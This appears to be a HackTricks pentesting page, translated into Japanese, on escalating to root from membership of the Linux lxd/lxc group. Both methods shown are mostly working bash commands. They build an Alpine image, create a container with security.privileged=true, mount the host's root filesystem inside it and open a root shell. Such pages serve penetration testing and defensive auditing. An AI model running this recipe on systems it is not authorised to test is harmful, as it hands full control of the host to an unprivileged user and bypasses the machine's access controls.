# lxd/lxc グループ - 特権昇格

{{#include ../../../banners/hacktricks-training.md}}

_**lxd**_ **または** _**lxc**_ **グループに属している場合、rootになることができます**

## インターネットなしでの悪用

### 方法 1

このディストリビューションビルダーをあなたのマシンにインストールできます: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(githubの指示に従ってください):
```bash
sudo su
# Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

# Clone repo
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container
## Using build-lxd
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
## Using build-lxc
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```
ファイル **lxd.tar.xz** と **rootfs.squashfs** をアップロードし、イメージをリポジトリに追加してコンテナを作成します:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> このエラー _**Error: No storage pool found. Please create a new storage pool**_\
> **`lxd init`** を実行し、前のコマンドのチャンクを **繰り返してください**

最後に、コンテナを実行してルートを取得できます:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

Alpineイメージをビルドし、フラグ`security.privileged=true`を使用して起動し、コンテナがホストファイルシステムとrootとして対話するように強制します。
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
